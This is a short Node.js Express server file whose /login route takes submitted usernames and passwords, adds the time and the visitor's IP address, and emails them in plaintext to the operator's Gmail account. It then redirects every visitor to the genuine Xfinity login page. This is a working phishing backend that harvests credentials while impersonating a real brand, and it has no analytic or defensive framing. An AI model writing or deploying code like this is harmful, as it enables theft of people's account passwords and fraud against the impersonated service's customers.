const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// Login route
app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    // Timestamp
    const timestamp = new Date().toLocaleString();

    // IP address
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Email setup
    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: "New Login Detected",
        text: `A login just occurred.

Username: ${username}
Password: ${password}

Time: ${timestamp}
IP Address: ${ip}

If this was you, no action is needed.`
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error("Email error:", error);
        // Even if email fails, continue to redirect
    }

    // Always redirect
    res.redirect("https://login.xfinity.com/login");
});

// Start server
app.listen(3000, () => {
    console.log("Server running on http://localhost:3000");
});